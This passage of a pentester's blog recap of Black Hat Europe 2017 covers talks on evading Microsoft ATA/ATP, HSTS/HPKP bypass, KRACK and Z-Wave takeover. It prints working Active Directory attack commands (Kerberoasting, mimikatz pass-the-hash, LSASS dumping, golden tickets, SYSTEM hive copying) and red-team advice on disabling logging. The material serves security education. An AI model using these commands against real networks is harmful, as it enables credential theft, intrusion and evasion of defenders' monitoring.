</span></span><span class=line><span class=cl><span class=nb>Get-NetUser</span> <span class=n>-SPN</span> <span class=p>|</span> <span class=nb>Get-SPNTicket</span> <span class=n>-OutputFormat</span> <span class=n>Hashcat</span>
</span></span></code></pre></td></tr></table></div></div><p><strong>Not detected</strong>: Silver ticket</p><p>The golden ticket is a forged TGT, Silver ticket is a forged TGS. No DC server contacted.</p><p><strong>Not detected</strong>: Enumerating AD Access Control Entries</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Invoke-BloodHound</span> <span class=n>-CollectionMethod</span> <span class=n>ACL</span> <span class=n>-ExcludeDC</span>
</span></span></code></pre></td></tr></table></div></div><p><strong>Not detected</strong>: Escalation via Selective AD ACL Abuse</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Add-DomainGroupMember</span> <span class=n>-Identity</span> <span class=n>sql01admins</span> <span class=n>-Members</span> <span class=n>edwardabbey</span>
</span></span><span class=line><span class=cl><span class=nb>Set-DomainUserPassword</span> <span class=n>-Identity</span> <span class=n>webservice</span> <span class=n>-AccountPassword</span><span class=nv>$Password</span>
</span></span></code></pre></td></tr></table></div></div><p>Over-Pass-The-Hash is detected using KRBTGT NTLM hash.</p><p><strong>Not detected</strong>: Over-Pass-The-Hash using all hash/keys.</p><p>In a mimikatz console:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>sekurlsa</span><span class=p>::</span><span class=n>pth</span> <span class=p>/</span><span class=n>user</span><span class=err>:</span><span class=n>administrator</span> <span class=p>/</span><span class=n>domain</span><span class=err>:</span><span class=n>prod</span><span class=p>.</span><span class=n>local</span> <span class=p>/</span><span class=n>aes256</span><span class=err>:</span><span class=p>&lt;</span><span class=n>data</span><span class=p>&gt;</span> <span class=p>/</span><span class=n>ntlm</span><span class=err>:</span><span class=p>&lt;</span><span class=n>hash</span><span class=p>&gt;</span> <span class=p>/</span><span class=n>aes128</span><span class=err>:</span><span class=p>&lt;</span><span class=n>data</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>Lateral movement via SQL Auth is not detected.</p><p>For the dominance.</p><p><strong>Not detected</strong>: PowerSploit: Mimikatz in memory w/ LSASS injection</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Invoke-Mimikatz</span> <span class=n>-Command</span> <span class=s1>&#39;&#34;privilege::debug&#34; &#34;LSADump::LSA /inject&#34;&#39;</span> <span class=n>-Computer</span> <span class=n>dc03</span><span class=p>.</span><span class=n>prod</span><span class=p>.</span><span class=n>local</span>
</span></span></code></pre></td></tr></table></div></div><p><strong>Not detected</strong>: PowerSploit: Ninja-Copy (PSRemoting with Raw Disk Access)</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Invoke-NinjaCopy</span> <span class=n>-Path</span> <span class=s2>&#34;c:\Windows\System32\config\SYSTEM&#34;</span> <span class=n>-ComputerName</span> <span class=s2>&#34;dc03.prod.local&#34;</span> <span class=n>-LocalDestination</span> <span class=s2>&#34;c:\temp\system&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p><strong>Not detected</strong>: Golden ticket w/ AES Key</p><p>In mimikatz console:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>kerberos</span><span class=p>::</span><span class=n>golden</span> <span class=p>/</span><span class=n>user</span><span class=err>:</span><span class=n>JohnVanwagoner</span> <span class=p>/</span><span class=n>domain</span><span class=err>:</span><span class=n>prod</span><span class=p>.</span><span class=n>local</span> <span class=p>/</span><span class=n>sid</span><span class=err>:</span><span class=n>sid</span> <span class=p>/</span><span class=n>aes256</span><span class=err>:</span><span class=n>aes256</span> <span class=p>/</span><span class=n>groups</span><span class=err>:</span><span class=n>512</span><span class=p>,</span><span class=n>513</span><span class=p>,</span><span class=n>519</span> <span class=p>/</span><span class=n>startoffset</span><span class=err>:</span><span class=p>-</span><span class=n>1</span> <span class=p>/</span><span class=n>endin</span><span class=err>:</span><span class=n>2500</span> <span class=p>/</span><span class=n>renewmax</span><span class=err>:</span><span class=n>3000</span> <span class=p>/</span><span class=n>ptt</span>
</span></span></code></pre></td></tr></table></div></div><table><thead><tr><th>Red Team Takeaways</th></tr></thead><tbody><tr><td>Return to living off the land, directly call APIs</td></tr><tr><td>Leverage host based PowerShell tools only after you&rsquo;ve blocked or disabled ATP & event log forwarding</td></tr><tr><td>Review RDP/PS/Session history to help avoid user behavior analytics</td></tr><tr><td>Block event log forwarding to prevent Sysmon/WMI/PowerShell/Security logs giving you away</td></tr><tr><td>Use ACE/DACL abuse to help avoid using RCE when possible</td></tr><tr><td>Focus on info gathering and lateral movement techniques that don&rsquo;t comm with the DC, liks SQL auth and Silver Tickets</td></tr><tr><td>Kerberoast & Silver Ticket all the things</td></tr><tr><td>Use AES for Over-PTH, Golden Tickets</td></tr><tr><td>Abuse Forest Trusts</td></tr></tbody></table><table><thead><tr><th>Blue Team Takeaways</th></tr></thead><tbody><tr><td>Limit PS Remoting sources to dedicated admin workstations</td></tr><tr><td>Use JEA (Just Enough Administration) to help prevent lateral movement success</td></tr><tr><td>Harden SQL servers, review forest trusts</td></tr><tr><td>Integrate SIEM/VPN logs into ATA</td></tr><tr><td>Use Event Log Forwarding for Sysmon and WMI logging with shorter polling times</td></tr><tr><td>Audit your AD object ACLs with BloodHound</td></tr><tr><td>Enforce AES-256, especially for service account SPNs</td></tr><tr><td>Enforce &ldquo;Binary Signature Policy&rdquo; in 1703 to help protect PPLs</td></tr><tr><td>Integrate those new Defender branded tools like Exploit Guard (WDEG)</td></tr><tr><td>Enforce EMET/WDEG&rsquo;s Attack Surface Reduction (ASR) rules</td></tr></tbody></table><p><strong>From a personal point of view</strong>, being a pentester, this presentation was one of the most interesting. I didn’t even know ATA and ATP before the briefing. Maybe I will build a little lab to test all of this.</p><h4 id=source-documents>Source documents</h4><ol><li>Chris THOMPSON, <em>Black hat presentation</em>, Thursday, December 7, 2017. <a href=https://www.blackhat.com/docs/eu-17/materials/eu-17-Thompson-Red-Team-Techniques-For-Evading-Bypassing-And-Disabling-MS-Advanced-Threat-Protection-And-Advanced-Threat-Analytics.pdf target=_blank rel="noopener noreffer">https://www.blackhat.com/docs/eu-17/materials/eu-17-Thompson-Red-Team-Techniques-For-Evading-Bypassing-And-Disabling-MS-Advanced-Threat-Protection-And-Advanced-Threat-Analytics.pdf</a></li><li>Andy Robbins, <em>[GitHub] BloodHoundAD</em>, September 19, 2016. <a href=https://github.com/BloodHoundAD/Bloodhound/wiki target=_blank rel="noopener noreffer">https://github.com/BloodHoundAD/Bloodhound/wiki</a></li></ol><h3 id=breaking-out-hsts-and-hpkp-on-firefox-ieedge-and-possibly-chrome>Breaking Out HSTS (and HPKP) on Firefox, IE/Edge and (Possibly) Chrome</h3><blockquote><p>Sheila Ayelen Berta & Sergio De Los Santos from ElevenPaths</p></blockquote><p>Most of the MITM attacks doesn’t work anymore today. That’s why HSTS and HPKP are created.</p><p>When a user is connected to an HSTS website, the first time the client connects to the port 80 of the website and he is redirected to the 443 port. With HSTS, next time client connects to the website, it will be automatically on the 443 port, then SSLStrip is useless.</p><p>HPKP will get the certificate signature, or “certificate pinning” and compares it at every connection. If the signature is modified, then the browser drop the connection.</p><h4 id=firefox>Firefox</h4><p>To remember which site has HSTS and who is the owner of each certificate signature, Firefox uses a small text file (SiteSecurityServiceState.txt). In the Firefox source code, this plain text file can take 1024 entries maximum.</p><p>With <strong>cloudspinning</strong> researchers sent a lot of HSTS data to the target Firefox. When 1024 entries are exceeded, the original results in the plain text are erased.</p><p>Then the client will need to go to the 80 port again, and if you start SSLStrip at the right moment, you’re MITM is perfectly performed.</p><p>To playing with the <strong>Score</strong> columns, you can use the Delorean script (2).</p><h4 id=chrome>Chrome</h4><p>Chrome runs the same system as Firefox, but there is no limit on this text file. <strong>Problem solved?</strong> Not really…</p><p>Even if there is no limit, Chrome will store every result in the file. If you send a lot of requests, just as with Firefox during a couple of minutes, 10⁄15 or more, this file will become very huge (200⁄300 Mo).</p><p>Each request sent by Chrome is analyzed with this file to know if we can use HSTS or HPKP. Then Chrome is unusable at all, because browsing a 400 Mo file is slow! Then, you have to wipe all data.</p><p>The same thing as Firefox, SSLStrip will work now.</p><h4 id=internet-exploreredge>Internet Explorer/EDGE</h4><p>IE/EDGE doesn’t use a simple text file, they use a database. Now, there is two important point here:</p><ul><li>The lack of documentation</li><li>IE does not support HPKP</li></ul><p>HSTS in IE/EDGE is managed by <strong>WinInet.dll</strong>.</p><p>Due to problems in the storage process, not all HSTS website is remembered. Then if you clear the cache, the user hasn’t a real HSTS protection.</p><p><strong>From a personal point of view</strong>, before this briefing I just had a little idea of how HSTS and HPKP works. The presentation was very clear and interesting.</p><h4 id=source-documents-1>Source documents</h4><ol><li>Sheila Ayelen Berta & Sergio De Los Santos, <em>Black hat presentation</em>, Thursday, December 7, 2017. <a href=https://www.blackhat.com/docs/eu-17/materials/eu-17-Berta-Breaking-Out-HSTS-And-HPKP-On-Firefox-IE-Edge-And-Possibly-Chrome.pdf target=_blank rel="noopener noreffer">https://www.blackhat.com/docs/eu-17/materials/eu-17-Berta-Breaking-Out-HSTS-And-HPKP-On-Firefox-IE-Edge-And-Possibly-Chrome.pdf</a></li><li>PentesterES, <em>[GitHub] Tools to bypass FF, Chrome and IE HSTS/HPKP protection</em>. <a href=https://github.com/PentesterES/Delorean target=_blank rel="noopener noreffer">https://github.com/PentesterES/Delorean</a></li></ol><h3 id=key-reinstallation-attacks-breaking-the-wpa2-protocol>Key Reinstallation Attacks: Breaking the WPA2 Protocol</h3><blockquote><p>Mathy Vanhoef from KU Leuven</p></blockquote><p>In the WPA2 process, there are 3 step:</p><ol><li>Pairing step</li><li>4-Way Handshake</li><li>Group Key Handshake</li></ol><p>The KRACK vulnerability is in the 4-Way Handshake. Here is a standard 4-Way Handshake:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/articles/bheu2017/krack1.png data-srcset="/lib/images/articles/bheu2017/krack1.png, /lib/images/articles/bheu2017/krack1.png 1.5x, /lib/images/articles/bheu2017/krack1.png 2x" data-sizes=auto alt=/lib/images/articles/bheu2017/krack1.png title=/lib/images/articles/bheu2017/krack1.png></p><ul><li>PTK = PRF(PMK, ANonce, SNonce, MAC client, MAC point d’accès)</li><li>PRF: Hashing function based on HMAC using SHA1</li><li>PMK: hash(SSID + Access point key)</li><li>Packet Number (PN): Incremental counter initialized to 0 at the beginning of the 4-Way Handshake, used to generate PMK.</li></ul><p>According to the <em>802.11r: FT - Fast Basic Service State Transition</em></p><p>If the access point never receives the last transmission of the 4-Way Handshake, it has to resend first message (ANonce + Access point MAC) and third message (“I generated the PTK!”). Each third message received by the client, it has to update the PN counter with the one received by the access point.</p><p>If an attacker intercepts the fourth message, then the client will continue to communicate normally (encrypted communication), but after few moment the access point will timeout and resend 1st en 3rd transmission. According to the norms, the client will reinstall the PN counter.</p><p>WPA2 cipher broken. After that, it’s easy to decrypt the network flow. Because GCMP and TKIP allow injection and forge of the new packet, then you can forge known packet and send him to the access point or client and received the encrypted packet.</p><p>Then:</p><ul><li>known_clear_packet XOR known_encrypt_packet = XOR_KEY</li><li>unknown_encrypted_packet XOR XOR_KEY = unknown_clear_packet</li></ul><p>Interesting fact, the WPA_Supplicant implement in Linux and Android will not reinstall the PTK with Access point PN counter after the fourth request. It will simply erase the PTK and replace it with 0.</p><p><a href="https://www.youtube.com/watch?v=fZ1R9RliM1w" target=_blank rel="noopener noreffer"><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://img.youtube.com/vi/fZ1R9RliM1w/0.jpg data-srcset="https://img.youtube.com/vi/fZ1R9RliM1w/0.jpg, https://img.youtube.com/vi/fZ1R9RliM1w/0.jpg 1.5x, https://img.youtube.com/vi/fZ1R9RliM1w/0.jpg 2x" data-sizes=auto alt=https://img.youtube.com/vi/fZ1R9RliM1w/0.jpg title="krack presentation"></a></p><p><strong>From a personal point of view</strong>, I’m a bit frustrated by this presentation. He didn’t go very far technically, just presented his paper (available on the internet). Also, Mathy Vanhoef didn’t release his tool, maybe in the 34C3…</p><h4 id=source-documents-2>Source documents</h4><ol><li>Mathy Vanhoef. <em>[Paper] Key Reinstallation Attack</em>, Thursday, December 7, 2017. <a href=https://papers.mathyvanhoef.com/blackhat-eu2017.pdf target=_blank rel="noopener noreffer">https://papers.mathyvanhoef.com/blackhat-eu2017.pdf</a>.</li><li>Mathy Vanhoef. <em>Krack Attack – Breaking WPA2 by forcing nonce reuse</em>, <a href=https://www.krackattacks.com/ target=_blank rel="noopener noreffer">https://www.krackattacks.com/</a></li><li>Mathy Vanhoef, <em>[GitHub] Test equipment</em>. <a href=https://github.com/vanhoefm/krackattacks-scripts target=_blank rel="noopener noreffer">https://github.com/vanhoefm/krackattacks-scripts</a></li><li>Hackndo aka Pixis. <em>[GitHub] Krack PoC</em>, <a href=https://github.com/Hackndo/krack-poc target=_blank rel="noopener noreffer">https://github.com/Hackndo/krack-poc</a></li><li>Hackndo aka Pixis, <em>KRACK casser le WPA2</em>, <a href=http://beta.hackndo.com/krack/ target=_blank rel="noopener noreffer">http://beta.hackndo.com/krack/</a></li></ol><h3 id=a-universal-controller-to-take-over-a-z-wave-network>A Universal Controller to Take Over a Z-Wave Network</h3><blockquote><p>Loïc ROUCH (speaker), Jérôme FRANÇOIS, Frédéric BECK from INRIA Nancy</p></blockquote><p>There is two mode in Z-wave: unsecure & secure. <em>Loïc ROUCH</em> explains how the <em>unsecure</em> mode can be exploited to make a universal controller.</p><p>The target network looks to:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/articles/bheu2017/zwave1.png data-srcset="/lib/images/articles/bheu2017/zwave1.png, /lib/images/articles/bheu2017/zwave1.png 1.5x, /lib/images/articles/bheu2017/zwave1.png 2x" data-sizes=auto alt=/lib/images/articles/bheu2017/zwave1.png title=/lib/images/articles/bheu2017/zwave1.png></p><p>The attacker will need:</p><ul><li>Z-Wave controller</li><li>DVB-T tuner</li></ul><p>There is a <strong>HomeID</strong>/<strong>NodeID</strong> for the master and only <strong>NodeID</strong> for the slave. During association and pairing, the master will send his HomeID to the slave.</p><p>Then, the attack is based on the HomeID. You have to get it and replay it to control all associated slaves.</p><p>The DVB-T Tuner is necessary to get the HomeID (3):</p><pre><code>rtl_sdr -f 868420000 -s 2000000 -g 25 - | ./wave-in -u
</code></pre><p>First fourth bytes are the HomeID.</p><p>Through the Backup and restore function, they restore the stolen HomeID.</p><p>But, impersonate the new HomeID doesn’t mean that you have the control of all slave. Not yet.</p><p>With the Z-Wave controller, you just have to scan the Network and slaves will connect to you.</p><p><strong>From a personal point of view</strong> it was a cool presentation, unfortunately, the demonstration didn’t work. Maybe I’ll try to reproduce this later :-)</p><h4 id=source-documents-3>Source documents</h4><ol><li>Loïc ROUCH, Jérôme FRANÇOIS & Frédéric BECK, <em>[Paper] A Universal Controller to Take Over a Z-Wave Network</em>, Thursday, December 7, 2017. <a href=https://www.blackhat.com/docs/eu-17/materials/eu-17-Rouch-A-Universal-Controller-To-Take-Over-A-Z-Wave-Network-wp.pdf target=_blank rel="noopener noreffer">https://www.blackhat.com/docs/eu-17/materials/eu-17-Rouch-A-Universal-Controller-To-Take-Over-A-Z-Wave-Network-wp.pdf</a></li><li>Loïc ROUCH, Jérôme FRANÇOIS & Frédéric BECK, <em>Black hat presentation</em>, Thursday, December 7, 2017. <a href=https://www.blackhat.com/docs/eu-17/materials/eu-17-Rouch-A-Universal-Controller-To-Take-Over-A-Z-Wave-Network.pdf target=_blank rel="noopener noreffer">https://www.blackhat.com/docs/eu-17/materials/eu-17-Rouch-A-Universal-Controller-To-Take-Over-A-Z-Wave-Network.pdf</a></li><li>Baol, <em>[GitHub] Waving-Z</em>. <a href=https://github.com/baol/waving-z target=_blank rel="noopener noreffer">https://github.com/baol/waving-z</a></li></ol><h3 id=goodies-hunting-part-2>Goodies hunting part 2</h3><p>With <a href=https://twitter.com/razaborg target=_blank rel="noopener noreffer">@razaborg</a> again, we wanted to try the <strong>NCC Group</strong> challenge.</p><p>This challenge was in 2 parts, first, we started with a commercial invoice and a QR Code. After that, NCC Group employee gave us an NFC card.</p><p>First step:</p><ul><li>Decoding QR code</li><li>Decoding Base64</li><li>Replacing data with right information (found in commercial invoice)</li><li>Re-encoding in Base64</li><li>Re-generating the QR Code</li></ul><p>Second step:</p><ul><li>Scan NFC card</li><li>Bunch of data -> Dcode helps us, it was Caesar shift 10</li><li>Replacing with right data (according to the commercial invoice again)</li><li>Re-generation of an MD5 hash -> we had to “brute-force” it.</li><li>Re-shifting</li><li>Flashing the NFC card</li></ul><p>w00t \o/</p><p>Here is a picture of my loot:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/articles/bheu2017/loot.jpg data-srcset="/lib/images/articles/bheu2017/loot.jpg, /lib/images/articles/bheu2017/loot.jpg 1.5x, /lib/images/articles/bheu2017/loot.jpg 2x" data-sizes=auto alt=/lib/images/articles/bheu2017/loot.jpg title=/lib/images/articles/bheu2017/loot.jpg></p><h2 id=others-briefing>Others briefing</h2><h2 id=arsenal>Arsenal</h2><p>The Arsenal was little presentation stand and people introduced their tools.</p><p>All tools are available on that GitHub: <a href=https://github.com/toolswatch/blackhat-arsenal-tools target=_blank rel="noopener noreffer">https://github.com/toolswatch/blackhat-arsenal-tools</a></p><p><strong>From a personal point of view</strong> Arsenal is really great to make known people, I think I will try in BH 2018 with <em>Auto-Vol</em>! :-D</p><h2 id=conclusion>Conclusion</h2><p>I think it’s my best event at this time! Briefings were crazy, arsenal tools were crazy too and there was a lot of goodies!</p><p>I also met nice people, such as:</p><ul><li><a href=https://twitter.com/PaulWebSec target=_blank rel="noopener noreffer">@PaulWebSec</a></li><li><a href=https://twitter.com/lyon01_david target=_blank rel="noopener noreffer">@lyon01_david</a></li><li><a href=https://twitter.com/_Bytemare target=_blank rel="noopener noreffer">@_Bytemare</a></li><li><a href=https://twitter.com/_SaxX_ target=_blank rel="noopener noreffer">@<em>SaxX</em></a></li></ul><p>Feel free to contact me on Twitter or by email! See you soon :-D</p><p>Thanks to Nicolas TERRIEN for his english skills! :D</p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Updated on 2017-10-03</span></div></div><div class=post-info-line><div class=post-info-md><span><a class=link-to-markdown href=maki.bzh/bheu2017/index.md target=_blank>Read Markdown</a></span></div><div class=post-info-share><span><a href=javascript:void(0); title="Share on Twitter" data-sharer=twitter data-url=maki.bzh/bheu2017/ data-title="Feeback of Black Hat Europe 2017" data-via=maki_mitz data-hashtags="bheu,friends,intel me,cti,feedback,maki life,goodies"><i class="fab fa-twitter fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Hacker News" data-sharer=hackernews data-url=maki.bzh/bheu2017/ data-title="Feeback of Black Hat Europe 2017"><i class="fab fa-hacker-news fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Line" data-sharer=line data-url=maki.bzh/bheu2017/ data-title="Feeback of Black Hat Europe 2017"><i data-svg-src=https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg aria-hidden=true></i></a><a href=javascript:void(0); title="Share on 微博" data-sharer=weibo data-url=maki.bzh/bheu2017/ data-title="Feeback of Black Hat Europe 2017"><i class="fab fa-weibo fa-fw" aria-hidden=true></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw" aria-hidden=true></i>&nbsp;<a href=maki.bzh/tags/bheu/>bheu</a>,&nbsp;<a href=maki.bzh/tags/friends/>friends</a>,&nbsp;<a href=maki.bzh/tags/intel-me/>intel me</a>,&nbsp;<a href=maki.bzh/tags/cti/>cti</a>,&nbsp;<a href=maki.bzh/tags/feedback/>feedback</a>,&nbsp;<a href=maki.bzh/tags/maki-life/>maki life</a>,&nbsp;<a href=maki.bzh/tags/goodies/>goodies</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=maki.bzh/>Home</a></span></section></div><div class=post-nav><a href=maki.bzh/feedbackecsc2018/ class=next rel=next title="Feeback of European CyberSecurity Challenge 2018 final CTF">Feeback of European CyberSecurity Challenge 2018 final CTF<i class="fas fa-angle-right fa-fw" aria-hidden=true></i></a></div></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line>Powered by <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.100.2">Hugo</a> | Theme - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden=true></i> LoveIt</a></div><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2017 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=maki.bzh/ target=_blank>Maki - Alan Marrec</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:50},comment:{},lightgallery:!0}</script><script type=text/javascript src=/maki.bzh/js/theme.min.js></script><script type=text/javascript>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-WVPYCS7SPM',{anonymize_ip:!0})</script><script type=text/javascript src="https://www.googletagmanager.com/gtag/js?id=G-WVPYCS7SPM" async></script></body></html>